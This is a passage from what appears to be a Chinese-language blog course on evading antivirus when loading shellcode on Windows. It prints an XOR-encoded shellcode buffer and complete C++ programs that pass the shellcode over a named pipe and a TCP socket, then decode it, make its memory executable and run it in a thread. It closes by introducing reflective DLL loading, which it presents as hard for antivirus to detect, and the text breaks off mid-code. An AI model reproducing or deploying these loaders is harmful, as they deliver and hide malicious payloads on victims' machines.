class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line">PTCHAR ptsPipeName = TEXT(<span class="string">&quot;\.\pipe\BadCodeTest&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">RecvShellcode</span><span class="params">(VOID)</span></span>&#123;</span><br><span class="line">    HANDLE hPipeClient;</span><br><span class="line">    DWORD dwWritten;</span><br><span class="line">    DWORD dwShellcodeSize = <span class="keyword">sizeof</span>(buf);</span><br><span class="line">    <span class="comment">// 等待管道可用</span></span><br><span class="line">    WaitNamedPipe(ptsPipeName,NMPWAIT_WAIT_FOREVER);</span><br><span class="line">    <span class="comment">// 连接管道</span></span><br><span class="line">    hPipeClient = CreateFile(ptsPipeName,GENERIC_WRITE,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_EXISTING ,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hPipeClient == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Can&#x27;t Open Pipe , Error : %d \n&quot;</span>,GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WriteFile(hPipeClient,buf,dwShellcodeSize,&amp;dwWritten,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(dwWritten == dwShellcodeSize)&#123;</span><br><span class="line">        CloseHandle(hPipeClient);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Send Success ! Shellcode : %d Bytes\n&quot;</span>,dwShellcodeSize);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hPipeClient);</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    RecvShellcode();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="网络套接字（socket）"><a href="#网络套接字（socket）" class="headerlink" title="网络套接字（socket）"></a>网络套接字（socket）</h2><p>通过建立一个客户端和服务端，进行Shellcode的收发，类似于Java中的反序列化。</p><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1a40f881fa1acfbe75f302bfff33a013.png"></p><p>Server:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">RunCode</span><span class="params">(CHAR * code,DWORD dwCodeLen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    DWORD dwThreadId;</span><br><span class="line">    PCHAR pszShellcode = (PCHAR)VirtualAlloc(<span class="literal">NULL</span>,dwCodeLen,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">    CopyMemory(pszShellcode,code,dwCodeLen);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(DWORD i = <span class="number">0</span>;i&lt; dwCodeLen; i++)&#123;</span><br><span class="line">            _InterlockedXor8(pszShellcode+i,<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">        VirtualProtect(pszShellcode,dwCodeLen,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line">        <span class="comment">// 执行Shellcode</span></span><br><span class="line">        hThread = CreateThread(</span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">            (LPTHREAD_START_ROUTINE)pszShellcode, <span class="comment">// 函数</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">            &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">        );</span><br><span class="line">        WaitForSingleObject(hThread,INFINITE);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR argv[])</span></span>&#123;</span><br><span class="line">    CHAR buf[<span class="number">801</span>];</span><br><span class="line">    DWORD dwError;</span><br><span class="line">    WORD sockVersion = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    SOCKET socks;</span><br><span class="line">    SOCKET sClient;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">s_client</span>;</span></span><br><span class="line">    INT nAddrLen = <span class="keyword">sizeof</span>(s_client);</span><br><span class="line">    SHORT sListenPort = <span class="number">8888</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WSAStartup(sockVersion, &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]WSAStarup Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (socks == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Socket Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">    <span class="built_in">sin</span>.sin_port = htons(sListenPort);</span><br><span class="line">    <span class="built_in">sin</span>.sin_addr.S_un.S_addr = INADDR_ANY;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(bind(socks,(struct sockaddr *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>)) == SOCKET_ERROR )</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Bind Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">listen</span>(socks, <span class="number">5</span>) == SOCKET_ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Listen  Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sClient = accept(socks, (SOCKADDR *)&amp;s_client, &amp;nAddrLen);</span><br><span class="line">    <span class="keyword">int</span> ret = recv(sClient,buf,<span class="keyword">sizeof</span>(buf),<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Recv %d-Bytes \n&quot;</span>,ret);</span><br><span class="line">        closesocket(sClient);</span><br><span class="line">        closesocket(socks);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WSACleanup();</span><br><span class="line">    RunCode(buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR argv[])</span></span>&#123;</span><br><span class="line">    DWORD dwError;</span><br><span class="line">    WORD sockVersion = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    SOCKET socks;</span><br><span class="line">    SHORT sListenPort = <span class="number">8888</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WSAStartup(sockVersion, &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]WSAStarup Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (socks == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Socket Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">    <span class="built_in">sin</span>.sin_port = htons(sListenPort);</span><br><span class="line">    <span class="built_in">sin</span>.sin_addr.S_un.S_addr = inet_addr(<span class="string">&quot;192.168.170.1&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">connect</span>(socks,(struct sockaddr *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>)) == SOCKET_ERROR )</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Bind Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret = send(socks,buf,<span class="keyword">sizeof</span>(buf),<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Send %d-Bytes \n&quot;</span>,ret);</span><br><span class="line">        closesocket(socks);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第六课"><a href="#第六课" class="headerlink" title="第六课"></a>第六课</h1><h2 id="MemoryMoudle"><a href="#MemoryMoudle" class="headerlink" title="MemoryMoudle"></a>MemoryMoudle</h2><p>项目背景：Windows操作系统在执行一个Windows PE格式的文件时，Windows自身是有一个Windows PE格式的解析器，通过PE格式把文件的各个节放入不同的内存区域。</p><p>爱折腾的程序员自己也想实现这个过程，那就是反射，这个反射机制就是将Windows PE格式通过自己写的代码进行解析，并把不同的节数据加载到内存中，通常这个反射加载技术被很多APT组织、大型渗透框架、病毒作者使用比较广泛。</p><p>当一个Windows PE格式的文件变成了一个内存中的字符串，意味着这个文件可以被任意方式去转换、加密、混淆，因此反病毒软件也难以查杀。</p><p>MemoryModule就是实现了这个过程：<a href="https://github.com/fancycode/MemoryModule">https://github.com/fancycode/MemoryModule</a></p><p>但是资料都是英文的，我在国内的社区上找到了中文版本的：<a href="https://gitee.com/china_jeffery/MemoryModule">https://gitee.com/china_jeffery/MemoryModule</a></p><p>就是从内存中加载DLL，具体实现原理：</p><p><a href="https://payloads.online/archivers/2019-03-14/1">https://payloads.online/archivers/2019-03-14/1</a></p><h2 id="反射DLL加载的实验"><a href="#反射DLL加载的实验" class="headerlink" title="反射DLL加载的实验"></a>反射DLL加载的实验</h2><p>首先体验一下正常DLL加载的过程：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">msg</span><span class="params">(VOID)</span></span>&#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>,TEXT(<span class="string">&quot;Test&quot;</span>),TEXT(<span class="string">&quot;Hello&quot;</span>),MB_OK);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span> <span 